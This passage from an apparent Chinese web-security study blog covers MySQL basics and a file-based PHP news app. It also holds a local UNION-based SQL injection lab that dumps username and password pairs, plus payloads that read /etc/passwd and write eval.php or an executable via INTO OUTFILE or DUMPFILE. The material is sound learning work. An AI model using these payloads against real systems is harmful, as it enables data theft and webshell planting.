!= $new_pass_again)&#123; die("&lt;script&gt;alert('两次输入密码不一致，请重新输入!')&lt;/script&gt;")； &#125; $pass = md5($new_pass); $uid = $_SESSION['uid']; include 'sql.php'; $sql = "UPDATE `users` SET `passwd` = '&#123;$pass&#125;' WHERE `id`=&#123;$uid&#125;;"; $result = mysql_query($sql) or die(mysql_error()); if(mysql_affected_rows())&#123; echo '&lt;script&gt;alert("密码修改成功！");&lt;/script&gt;'; &#125;else&#123; echo '&lt;script&gt;alert("密码修改成功！");&lt;/script&gt;'; &#125; &#125;?&gt;]]></content>
      <categories>
        <category>Web Security</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[note22]]></title>
    <url>%2F2019%2F08%2F13%2Fnote22%2F</url>
    <content type="text"><![CDATA[Abstract: MYSQL常用函数的讲解 一、常用函数 函数名 作用 version() 返回数据库的版本号 database() 返回当前数据库名 user() 返回当前用户 system_user() 返回当前用户 concat(s1, s2, …, sn)字符串s1，s2等多个字符串合并为一个字符串。 12-- MY SQL FUNCTIONSELECT CONCAT(&quot;MY &quot;, &quot;SQL &quot;, &quot;FUNCTION &quot;); concat_ws(x, s1, s1, …, sn)把字符串合并成一个字符串，两两间以x连接。 12-- I-LOVE-SQLSELECT CONCAT_WS(&quot;-&quot;, &quot;I&quot;, &quot;LOVE&quot;, &quot;SQL&quot;); group_concat(s1, ‘ ‘, s2 )返回一个字符串结果，该结果由分组中的值连接组合而成。 1SELECT GROUP_CONCAT(username, &apos;-&apos;, passwd) FROM `USERS`; left(s, n)返回字符串s前n个字符。 1234-- helloSELECT LEFT(&apos;hello world&apos;, 5);-- helllo wSELECT LEFT(&apos;hello world&apos;, 7); right(s, n)返回字符串s的后n个字符。 12-- o worldSELECT RIGHT(&apos;hello world&apos;, 7); substr/substring(s, start, length) 123456-- o SELECT SUBSTR(&apos;hello world&apos;, 5, 2);SELECT SUBSTRING(&apos;hello world&apos;, 5, 2);-- o woSELECT SUBSTR(&apos;hello world&apos;, 5, 4);SELECT SUBSTRING(&apos;hello world&apos;, 5, 4); mid(s, n, len)从字符串s的start位置截取长度为length的子字符串 12-- o wSELECT MID(&apos;hello world&apos;, 5, 3); DISTINCT 过虑重复的记录 1SELECT DISTINCT name FROM user; UNION操作符用于合并两个或多个SELECT语句的结果集 NOTE: UNION内部的每个SELECT语句必须拥有相同数量的列，列也必须拥有相似的数据类型。UNION在进行表连接后会筛选掉重复的记录，UNION ALL只是简单的将两个结果合并后返回。 1SELECT 字段名 FROM 表1 UNION SELECT 字段名 FROM 表2 ORDER BY在SQL注入中用于判断字段数，然后用UNION用于输出信息。 LIKE 操作符 左右 _ 代表任意单个字符 % 代表任意多字符 12345SELECT id FROM users WHERE &apos;username&apos; LIKE &apos;b%&apos;;SELECT id FROM users WHERE &apos;username&apos; LIKE &apos;%o%&apos;;SELECT id FROM users WHERE &apos;username&apos; LIKE &apos;admi_&apos;;-- 把标题中含有1作者名含有1值含有1的数据列出SELECT * FROM test.content WHERE title LIKE &apos;%1%&apos; or author like &apos;%1%&apos; or value like %1%&apos;&apos; like %q%包含q的 %q q在结尾 q% q在开头 二、读写文件1. 写文件12345-- 绝对路径into dumpfile &quot;filepath&quot;-- 绝对路径into outfile &quot;filepath&quot;select 123 into outfile/dumpfile &apos;/var/www/html/eval.php&apos;; 2. 读文件1234567-- 绝对路径load_file(&apos;filepath&apos;)select load_file(&apos;/etc/passwd&apos;);create table data( data text)insert into data values(load_file(&apos;&apos;)); load file: 读取文件并以字符串形式返回文件内容。 into outfile: 将所选行写入文件，该文件会在服务器主机上进行创建，所以你必须要有执行这条命令的权限，还要注意要写入文件不能是现有的文件。如：/etc/passwd 以下内容不太懂，先记住 文件转十六进制，然后unhexo into dumpfile 本地使用hex(load file(‘path’))处理二进制文件 服务器上，执行select unhex(0x十六进制内容) into dumpfile “/tmp/a.exe”]]></content>
      <categories>
        <category>Web Security</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[练习7]]></title>
    <url>%2F2019%2F08%2F13%2Fpractice7%2F</url>
    <content type="text"><![CDATA[Abstract: 先在数据库中使用UNION写SQL查出数据库版本，库，表，列等信息，再在index.php中操作一遍。 一、首先确定列数1234-- 先用order by根据是否报错确定列数SELECT * FROM users WHERE username=&apos;admin&apos; ORDER BY 4;SELECT * FROM users WHERE username=&apos;admin&apos; ORDER BY 5;SELECT * FROM users WHERE username=&apos;admin&apos; ORDER BY 6; OUT 由输出结果可知，共有五列。 二、读取数据1. 确定库名1SELECT * FROM users WHERE username=&apos;admin&apos; UNION SELECT version(), (SELECT group_concat(schema_name) FROM information_schema.schemata), 3, 4, 5; OUT 2. 确定表名1SELECT * FROM users WHERE username=&apos;admin&apos; UNION SELECT 1, (select group_concat(table_name) FROM information_schema.tables WHERE table_schema=&apos;mynews&apos;), 3, 4, 5 limit 1,1; OUT 1SELECT * FROM users WHERE username=&apos;admin&apos; UNION SELECT 1, (select group_concat(table_name) FROM information_schema.tables WHERE table_schema=&apos;test&apos;), 3, 4, 5 limit 1,1; OUT 对库进行一一查询，找到目标库 3. 列名1SELECT * FROM users WHERE username=&apos;admin&apos; UNION SELECT 1, (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name=&apos;content&apos;), 3, 4, 5 limit 1,1; OUT 1SELECT * FROM users WHERE username=&apos;admin&apos; UNION SELECT 1, (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name=&apos;users&apos;), 3, 4, 5 limit 1,1; 可以看到有重复的字段，原因是昨天练习数据库导入时，对同一.sql文件导入不同的库，即不同库里存着名为users和content的表。加上限定条件即可。 1SELECT * FROM users WHERE username = &apos;admin&apos; UNION SELECT 1,2,3,4,group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_NAME=&apos;users&apos; AND TABLE_SCHEMA=&apos;test&apos;; OUT 1SELECT * FROM users WHERE username=&apos;admin&apos; UNION SELECT 1, (SELECT group_concat(username, passwd) FROM `test`.`content`), 3, 4,5; OUT 可以利用查到的库名表名字段名，查看对应的信息。 三、网页上练习1. 环境首先把index.php拷贝到工程文件中，用phpstorm打开文件，在Terminal输入 1php -S 127.0.0.1:9000 在浏览器中打开网页http://127.0.0.1:9000/index.php 首页如下： 2. 前期工作index.php显示程序如下： 可知，显示的读取数据的前三个。 在提交按钮输入 1SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; order by 49; 1SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; order by 50; 可知字段数为49。 3. 开始查询 查询库名 1SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; UNION SELECT version(), user(), (SELECT group_concat(schema_name) FROM information_schema.schemata),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49 LIMIT 1,1 查询表名 1SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; UNION SELECT 1, 2, (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=&apos;test&apos;),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49 LIMIT 1,1 查询字段名 1SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; UNION SELECT 1, 2, (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name=&apos;content&apos;),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49 LIMIT 1,1 可以看出来有重复的字段名，这是因为两个不同库里均有content和users表。加上库名的限制就正常了。 1SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; UNION SELECT 1, 2, (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name=&apos;content&apos; AND table_schema=&apos;test&apos;),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49 LIMIT 1,1 1SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; UNION SELECT 1, 2, (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name=&apos;user&apos;),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49 LIMIT 1,1 查询数据 1SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; UNION SELECT 1, 2, (SELECT concat_ws(&apos;~&apos;, author, title) FROM `test`.`content` LIMIT 0,1),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49 LIMIT 1,1 1SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; UNION SELECT 1, 2, (SELECT group_concat(author, &apos;~&apos;,title) FROM`test`.`content`),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49 LIMIT 1,1 同理也可查出users数据 1SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; UNION SELECT 1, 2, (SELECT group_concat(username, &apos;~&apos;, passwd) FROM `test`.`users`),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49 LIMIT 1,1]]></content>
      <categories>
        <category>Web Security</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[highlight]]></title>
    <url>%2F2019%2F08%2F13%2Fhighlight%2F</url>
    <content type="text"><![CDATA[Abstract: 解决markdown代码上传到github上不高亮的问题。 Syntax123&#123;% codeblock [lang:language] [title] [url] [link text] %&#125;code snippet&#123;% endcodeblock %&#125; ExampleJavascript Array SyntaxMDN Documentation12var arr1 = new Array(arrayLength);var arr2 = new Array(element0, element1, ..., elementN); 123456789a='foo';print(a);#python dictionarydict = &#123;'Name': 'Zara', 'Age': 7, 'Class': 'First'&#125;print "dict['Name']: ", dict['Name']print "dict['Age']: ", dict['Age'] 1SELECT column_name FROM information_schema.columns WHERE table_name='content'; 12345678&lt;?php $cars = array("Volvo", "BMW", "Toyota"); echo $cars[0]; //输出"Volvo" echo $cars[1]; //输出"BMW" echo $cars[2]; //输出"Toyota"?&gt; 123dict = &#123;'Name': 'Zara', 'Age': 7, 'Class': 'First'&#125;print "dict['Name']: ", dict['Name']print "dict['Age']: ", dict['Age']]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>issue</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[练习6]]></title>
    <url>%2F2019%2F08%2F12%2Fpractice6%2F</url>
    <content type="text"><![CDATA[Abstract: MySQL中information_schema库的使用 1SELECT schema_name FROM information_schema.schemata; OUT 显示出所有库名。 1SELECT table_name FROM information_schema.tables WHERE table_schema=&apos;mynews&apos;; OUT 显示出mynews库中所有表名。 1SELECT table_name FROM information_schema.tables WHERE table_schema=&apos;test&apos;; OUT 找到目标，发现test库中有两张表content和users。 1SELECT column_name FROM information_schema.columns WHERE table_name=&apos;users&apos;; 显示出users表中的字段。 1SELECT username, passwd FROM test.users; OUT 1SELECT column_name FROM information_schema.columns WHERE table_name=&apos;content&apos;; 显示出content表中的字段。 OUT]]></content>
      <categories>
        <category>Web Security</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[note21]]></title>
    <url>%2F2019%2F08%2F12%2Fnote21%2F</url>
    <content type="text"><![CDATA[Abstract: 对MySQL数据库的简单介绍和基本操作包括创建数据库，读取数据库信息，创建表，对表中的数据进行增删改查。以及对information_schema表的理解。 一、MySQL数据库MySQL是流行的关系型数据库管理系统。 数据库：一些关联表的集合。 数据表：是数据的矩阵。 列：一列包含相同类型的数据，例如用户名数据。 行：一行是一组相关数据，例如一条用户订阅的数据。 主键：主键是唯一的，一个数据表中只能包含一个主键。可以用主键查询数据。 外键：外键用于关联两个表。 二、MySQL基础应用1. 关于数据库123456#创建数据库CREATE DATABASE mytest;#查看数据库SHOW DATABASES;#使用数据库USE mytest; 2. 关于数据表1234567891011121314151617181920212223#创建一个名为user的数据表CREATE TABLE `user`( `id` SMALLINT, `username` VARCHAR(20),);#查看当前数据库中所有的数据表SHOW TABLES;#查看创建数据库时的描述SHOW CREATE TABLE user;#向user表中插入一条数据INSERT user VALUES(&apos;1&apos;, &apos;admin&apos;);#向user表中插入一条记录只包含名字的信息INSERT user(`username`) VALUES(&quot;cat&quot;);#向user表中同时插入多条记录INSERT user VALUES(&apos;2&apos;, &apos;zs&apos;), (&apos;3&apos;, &apos;ww&apos;);#查看数据表中的所有记录SELECT * FROM user;#修改数据表姓名ALERT TABLE admin RENAME TO nimda;#更改数据UPDATE nimda SET `id`=4;#删除数据表DROP TABLE user; 库名 表名 字段 用户名tb_users 名字、密码、邮箱、昵称、创建时间等 mynews 新闻表tb_news 标题、内容、作者 评论表tb_comment 新闻id、评论内容、评论用户 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#创建新的数据库CREATE DATABASES mynews;#查看数据库SHOW DATABASE;#使用mynews库USE mynews;#创建一个名为tb_users表CREATE TABLE `tb_users`( #id非空自增 `id` int(10) NOT NULL AUTO_INCREMENT, #用户名非空唯一 `username` VARCHAR(50) NOT NULL UNIQUE, `password` VARCHAR(50) NOT NULL, `email` VARCHAR(50) NULL UNIQUE, `nickname` VARCHAR(50) NOT NULL, `safepoint` VARCHAR(50) NULL, #头像默认 `avatarimg` VARCHAR(100) DEFAULT &apos;/images/default_avatar.jpg&apos;, #时间 `reg_time` TIMESTAMP DEFAULT CURRENT_TIMESTAMP(), `lastlogin_time` TIMESTAMP DEFAULT CURRENT_TIMESTAMP(), `lastlogin_ip` VARCHAR(255) NULL, PRIMARY KEY(`id`));#向tb_users表插入一条数据INSERT INTO `mynews`.`tb_users`(`username`, `password`, `email`, `nickname`) VALUES (&apos;zs&apos;, &apos;zs123&apos;, &apos;zs123@icq.com&apos;, &apos;zs123&apos;)#创建一个名为tb_news表create table `tb_news`( `id` int(0) not null auto_increment, `title` varchar(255) not null, `contents` text not null, `author` varchar(50) not null, `new_img` varchar(100) null, `add_time` timestamp default current_timestamp(), `hot` int(0) default 0, primary key(`id`));#向tb_news表插入数据INSERT INTO `mynews`.`tb_news`(`title`, `contents`, `author`) VALUES (&apos;打完宽面&apos;, &apos;吃面！吃面！&apos;, &apos;zs&apos;);INSERT INTO `mynews`.`tb_news`(`title`, `contents`, `author`) VALUES (&apos;鸡你太美&apos;, &apos;太美！太美！&apos;, &apos;ww&apos;);#创建一个名为tb_comment表create table `tb_comment`( `id` int(0) not null auto_increment, `new_id` int(0) not null, `comment_content` text not null, `comment_user` varchar(50) not null, `comment_time` timestamp default current_timestamp(), primary key(`id`));#向tb_comment表插入数据INSERT INTO `mynews`.`tb_comment`(`new_id`, `comment_content`, `comment_user`) VALUES (&apos;1&apos;, &apos;吴亦凡&apos;, &apos;ww&apos;);INSERT INTO `mynews`.`tb_comment`(`new_id`, `comment_content`, `comment_user`) VALUES (&apos;2&apos;, &apos;坤坤&apos;, &apos;zs&apos;);#修改数据UPDATE `mynews`.`tb_news` SET `author` = &apos;ls&apos; WHERE `id` = 1;UPDATE `tb_comment` SET `comment_content` = &apos;蔡徐坤&apos; WHERE `id` = 2;ALTER TABLE `mynews`.`tb_users` ADD UNIQUE (`username`); 三、information_schemainformation_schema这个数据库中保存了MySQL服务器所有数据库的信息。如数据库名，数据库的表，表中的数据类型与访问权限等。 表名 字段作用 schemata schema_name记录了所有数据库的名字 tables table_schema记录了所有数据库的名字 tables table_name记录了所有数据库的表的名字 columns table_schema记录了所有数据库的名字 columns table_name记录了所有数据库的表名字 columns column_name记录了所有数据库的表的列的名字 查询数据核心语法： 功能名称 查询语句 查库 SELECT schema_name FROM information_schema.schemata 查表 SELECT table_name FROM information_schema.tables WHERE table_schema=库名 查列 SELECT column_name FROM information_schema.columns WHERE table_name=表明 查数据 SELECT 列名 FROM 库名.表名 12mysql -uroot -p mynews &lt; pathmysqldump -uroot -p mysql &gt; path]]></content>
      <categories>
        <category>Web Security</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[练习5]]></title>
    <url>%2F2019%2F08%2F11%2Fpractice5%2F</url>
    <content type="text"><![CDATA[Abstract: 把新闻信息，用户信息存放在文件中，用对文件的读写，实现用户的登录注册以及对新闻的增删改查。 一、目录结构 ###目录结构： | index.php //初始化页面 |——– data //文件存放目录 | news.db //存放新闻信息文件 | users.db //存放用户信息文件 |——— lib //脚本存放目录 | login.html // 用户登录界面 | checklogin.php //处理用户登录信息 | logup.html //用户注册界面 | checkSignUp.php //处理用户注册信息 | addNews.php //添加新闻界面 | del.php //删除新闻界面 | upload.php //上传头像界面 | getpasswd.php //修改密码界面 | checkpass.php //对hgetpasswd.php发送的数据进行处理 |——– css //用户登录和注册界面的css目录 | login.css //用户登录的css | logup.css //用户注册的css |——– upload //用户上传头像目录 |——– basedir //存放页面头部尾部和一些公共函数 | header.php //页面头部 | footer.php //页面尾部 | function.php //定义了一些公共函数 二、新闻界面 index.php123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172&lt;?phpsession_start();?&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;news&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;br&gt;&lt;!--区分普通用户和管理员用户--&gt;&lt;?php if(isset($_SESSION[&apos;uname&apos;]))&#123; echo &lt;&lt;&lt;EOF &lt;div&gt; &lt;img src=&quot;../images/logo.png&quot; height=&quot;100px&quot; width=&quot;100px&quot; style=&quot;float: left&quot;&gt; &lt;/div&gt; &lt;div style=&quot;float: right&quot;&gt; &lt;img src=&apos;../upload/headimg.jpg&apos; height=&quot;60px&quot; width=&quot;60px&quot;&gt; &lt;br&gt; &lt;a href=&quot;../logout.php&quot;&gt;注销用户&lt;/a&gt; &lt;/div&gt;EOF;&#125;?&gt;&lt;h1 align=&quot;center&quot;&gt;ICQ新闻中心&lt;/h1&gt;&lt;hr&gt;&lt;table align=&quot;center&quot;&gt; &lt;tr&gt; &lt;th&gt;热度&lt;/th&gt; &lt;th&gt;标题&lt;/th&gt; &lt;th&gt;作者&lt;/th&gt; &lt;th&gt;时间&lt;/th&gt; &lt;/tr&gt; &lt;?php //用只读方式打开news.db文件 $fhandle = fopen(&quot;./data/news1.db&quot;, &quot;r&quot;); //设置一个计数器，小于3时，每个文章标题下面增加图片和简介 $top3Cnt=1; while(!feof($fhandle)) &#123; $fline = fgets($fhandle); $data = explode(&apos;||&apos;, $fline); @$title = base64_decode($data[1]); @$content = base64_decode($data[2]); @$date = $data[3]; @$author = base64_decode($data[4]); @$hot = $data[5]; @$imgUrl = $data[6]; echo &lt;&lt;&lt;EOF &lt;tr align=&quot;center&quot;&gt; &lt;td&gt;$hot&lt;/td&gt; &lt;td&gt;&lt;a href=&quot;myl.php&quot;&gt;$title&lt;/a&gt;&lt;/td&gt; &lt;td&gt;$author&lt;/td&gt; &lt;td&gt;$date&lt;/td&gt; &lt;/tr&gt;EOF; //新闻前三个显示图片和简介 if($top3Cnt&lt;=3)&#123; $tmpContent = mb_substr(base64_decode($data[2]), 0,50); echo &lt;&lt;&lt;EOF &lt;tr&gt; &lt;td&gt;&lt;img src=&quot;$imgUrl&quot; height=&quot;80&quot; width=&quot;80&quot;&gt;&lt;/td&gt; &lt;td colspan=&apos;4&apos;&gt;&lt;b&gt;内容简介：&lt;/b&gt;$tmpContent&lt;/td&gt; &lt;/tr&gt;EOF; &#125; $top3Cnt++; &#125; ?&gt;&lt;/table&gt;&lt;/body&gt;&lt;/html&gt; 普通用户显示界面： 管理员用户显示界面： 三、用户登录和用户注册1.login.html1234567891011121314151617181920212223242526272829&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;登录页面&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/login.css&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;box&quot;&gt; &lt;div class=&quot;top&quot;&gt; &lt;h1&gt;登录&lt;/h1&gt; &lt;/div&gt; &lt;form action=&quot;checklogin.php&quot; method=&quot;post&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;手机号/邮箱/用户名&quot;&gt; &lt;br&gt; &lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;密码&quot;&gt; &lt;br&gt; &lt;input class=&quot;input_code&quot; type=&quot;text&quot; name=&quot;verifycode&quot; placeholder=&quot;验证码&quot;&gt; &lt;img class=&quot;verifycode&quot; src=&quot;https://passport.360.cn/captcha.php?m=create&amp;app=i360&amp;scene=login&amp;userip=&amp;level=default&amp;sign=8820a4&amp;r=1564540365&amp;border=none&amp;_=1564540365972&quot;&gt; &lt;br&gt; &lt;a class=&quot;signup&quot; href=&quot;logup.html&quot;&gt;注册账号&lt;/a&gt; &lt;a class=&quot;getpass&quot; href=&quot;./tmp/getpasswd.php&quot;&gt;忘记密码&lt;/a&gt; &lt;br&gt; &lt;input class=&quot;login&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;登录&quot;&gt; &lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 2.checklogin.php12345678910111213141516171819202122232425262728293031323334353637&lt;?php session_start();?&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt; 登录 &lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;?php$fhandle = fopen(&apos;./data/users.db&apos;, &apos;r&apos;);while(!feof($fhandle)) &#123; $InMes = fgets($fhandle); $mesArray = explode(&apos;||&apos;, $InMes); if(count($mesArray)!=2)&#123; continue; &#125; if(trim($mesArray[0])==$_POST[&apos;username&apos;] &amp;&amp; trim($mesArray[1])==$_POST[&apos;password&apos;])&#123; $_SESSION[&apos;uname&apos;] = $_POST[&apos;username&apos;]; echo &quot;正在进入后台&quot;; echo &lt;&lt;&lt;EOF &lt;script&gt;location.href=&quot;./data/addNews.php&quot;&lt;/script&gt;EOF; $flag=0; break; &#125; $flag = 1;&#125;if($flag==1)&#123; echo &quot;&lt;script&gt;alert(&apos;账号或密码错误！重新输入。&apos;)&lt;/script&gt;&quot;; echo &quot;&lt;script&gt;history.back()&lt;/script&gt;&quot;;&#125;?&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 登录成功界面： 登录失败界面： 3. checklogup.phplogup.html与login.html程序接近 12345678910111213141516171819202122232425&lt;?phpsession_start();$fhandle = fopen(&apos;./data/users.db&apos;, &apos;a+&apos;);$userMes = array();$storeMes = array();@$userMes[0] = $_POST[&apos;username&apos;];@$userMes[1]=$_POST[&apos;password&apos;];@$userMes[2]=$_POST[&apos;checkpasswd&apos;];if(strcmp($userMes[1], $userMes[2])!=0)&#123; echo &quot;&lt;script&gt;alert(&apos;两次输出密码不同！请重新输入！&apos;)&lt;/script&gt;&quot;; echo &quot;&lt;script&gt;history.back()&lt;/script&gt;&quot;;&#125;else &#123; $storeMes[0] = $userMes[0]; $storeMes[1] = $userMes[1]; $inMes = implode(&apos;||&apos;, $storeMes); if (count($userMes) == 3) &#123; fputs($fhandle, $inMes . &quot;\n&quot;); fclose($fhandle); echo &quot;&lt;script&gt;alert(&apos;用户注册成功&apos;)&lt;/script&gt;&quot;; echo &quot;&lt;script&gt;location.href=&apos;login.html&apos;&lt;/script&gt;&quot;; $_SESSION[&apos;uname&apos;] = $_POST[&apos;username&apos;]; &#125;&#125;?&gt; 用户注册失败： 用户注册成功： 四、新闻的增删改查1. 添加新闻 addNews.php123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;!--添加头部信息--&gt;&lt;?php include &apos;../basedir/header.php&apos;; include &apos;../basedir/function.php&apos;;?&gt;&lt;div align=&quot;center&quot;&gt; &lt;?php if($_SESSION[&apos;uname&apos;]==NULL) &#123; echo &quot;&lt;script&gt;alert(&apos;请登录&apos;); location.href=&apos;../login.html&apos;&lt;/script&gt;&quot;; die(&quot;请登录&quot;); &#125; ?&gt; &lt;a href=&quot;upload.php&quot;&gt;上传头像&lt;/a&gt; &amp;nbsp &amp;nbsp &amp;nbsp &amp;nbsp &amp;nbsp &lt;a href=&quot;del.php&quot;&gt;删除新闻&lt;/a&gt; &amp;nbsp &amp;nbsp &amp;nbsp &amp;nbsp &amp;nbsp &lt;a href=&quot;getpasswd.php&quot;&gt;修改密码&lt;/a&gt;&lt;/div&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;div align=&quot;center&quot;&gt; &lt;form action=&quot;addNews.php&quot; method=&quot;post&quot;&gt; &lt;?php if($_SESSION[&apos;uname&apos;]==NULL) echo &quot;&lt;script&gt;alert(&apos;请登录&apos;); location.href=&apos;../login.html&apos;&lt;/script&gt;&quot;; die(&quot;请登录&quot;); ?&gt; &lt;input type=&quot;text&quot; name=&quot;title&quot; placeholder=&quot;文章标题&quot;&gt;&lt;br&gt; &lt;br&gt; &lt;input type=&quot;number&quot; name=&quot;hot&quot; placeholder=&quot;热度&quot;&gt;&lt;br&gt; &lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;imgUrl&quot;&gt;&lt;br&gt; &lt;br&gt; &lt;textarea name=&quot;content&quot; cols=&quot;100&quot; rows=&quot;50&quot; placeholder=&quot;文章内容&quot;&gt;&lt;/textarea&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt; &lt;/form&gt;&lt;/div&gt;&lt;?php $fhandle = fopen(&apos;../data/news2.db&apos;, &apos;a&apos;); $t = time(); $arrMes = array(); @$arrMes[0] = computerId(&apos;../data/news2.db&apos;)+1; @$arrMes[1] = base64_encode($_POST[&apos;title&apos;]); @$arrMes[2] = base64_encode($_POST[&apos;content&apos;]); @$arrMes[3] = date(&quot;Y-m-d&quot;, $t); @$arrMes[4] = base64_encode($_SESSION[&quot;username&quot;]); @$arrMes[5] = $_POST[&apos;hot&apos;]; @$arrMes[6] = $_POST[&apos;imgUrl&apos;]; if (count($arrMes) == 7) &#123; $writeMes = implode(&apos;||&apos;, $arrMes); $fline = fputs($fhandle, $writeMes.&quot;\n&quot;); if ($fline != flase) &#123; echo &quot;&lt;script&gt;alert(\&quot;新闻添加成功！\&quot;)&lt;/script&gt;&quot;; echo &quot;&lt;a href=&apos;../index.php&apos;&gt;点击查看&lt;/a&gt;&quot;; &#125; &#125; fclose($fhandle);?&gt;&lt;!--添加尾部信息--&gt;&lt;?php include &quot;../basedir/footer.php&quot;;?&gt; 添加新闻页面： 2. 删除新闻 del.php思路：每条新闻对应一个id号，通过输入id判断要删除的新闻，程序循环读取文件每一行数据，再通过字符串函数把id号取出，若id不匹配把每行数据push到一个数组里面，若相等则跳过。然后再通过for循环把存入数据的数组以w格式重新写入文件即可。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879&lt;?php include &apos;../basedir/header.php&apos;; include &apos;../basedir/function.php&apos;;?&gt; &lt;?php if($_SESSION[&apos;uname&apos;]==NULL) echo &quot;&lt;script&gt;alert(&apos;请登录&apos;); location.href=&apos;../login.html&apos;&lt;/script&gt;&quot;; ?&gt; &lt;div align=&quot;center&quot;&gt; &lt;a href=&quot;upload.php&quot;&gt;上传头像&lt;/a&gt; &amp;nbsp &amp;nbsp &amp;nbsp &amp;nbsp &amp;nbsp &lt;a href=&quot;../data/addNews.php&quot;&gt;添加新闻&lt;/a&gt; &amp;nbsp &amp;nbsp &amp;nbsp &amp;nbsp &amp;nbsp &lt;a href=&quot;getpasswd.php&quot;&gt;修改密码&lt;/a&gt; &lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;form action=&quot;del.php&quot; method=&quot;post&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;id&quot; placeholder=&quot;请输入要删除文章的编号&quot;&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt; &lt;/form&gt; &lt;a href=&quot;../index.php&quot; target=&quot;_blank&quot;&gt;点击查看&lt;/a&gt; &lt;/div&gt;&lt;table&gt; &lt;table align=&quot;center&quot;&gt; &lt;tr&gt; &lt;th&gt;标号&lt;/th&gt; &lt;th&gt;标题&lt;/th&gt; &lt;th&gt;作者&lt;/th&gt; &lt;/tr&gt; &lt;?php $f = fopen(&apos;../data/news1.db&apos;, &apos;r&apos;); while(!feof($f))&#123; $fline = fgets($f); $data = explode(&apos;||&apos;, $fline); @$artId = $data[0]; @$title = base64_decode($data[1]); @$author = base64_decode($data[4]); echo &lt;&lt;&lt;EOF &lt;tr align=&quot;center&quot;&gt; &lt;td&gt;$artId&lt;/td&gt; &lt;td&gt;$title&lt;/td&gt; &lt;td&gt;$author&lt;/td&gt; &lt;/tr&gt;EOF; &#125; ?&gt;&lt;/table&gt;&lt;?php @$id = $_POST[&apos;id&apos;]; $fhandle = fopen(&apos;../data/news1.db&apos;, 